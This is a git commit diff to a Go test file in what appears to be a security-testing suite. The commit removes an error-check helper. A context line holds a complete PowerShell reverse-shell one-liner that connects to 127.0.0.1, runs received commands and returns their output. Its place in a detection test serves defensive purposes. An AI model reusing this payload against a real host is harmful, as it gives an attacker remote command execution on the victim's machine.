d0826106c3706afda80ccf72b4633830cff637f5
gerbsec <albabawaseem@gmail.com>
2023-01-05 12:55:58 -0800

    Added exit codes

--- tests/c521b330-70eb-4c4d-b748-a8869a7bac4c/c521b330-70eb-4c4d-b748-a8869a7bac4c.go
+++ tests/c521b330-70eb-4c4d-b748-a8869a7bac4c/c521b330-70eb-4c4d-b748-a8869a7bac4c.go
@@ -12,12 +12,6 @@ import (
 	"runtime"
 )
 
-func check(err error) {
-	if err != nil {
-		fmt.Println(err)
-	}
-}
-
 func test() {
 	if runtime.GOOS == "windows" {
 		mal := "$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
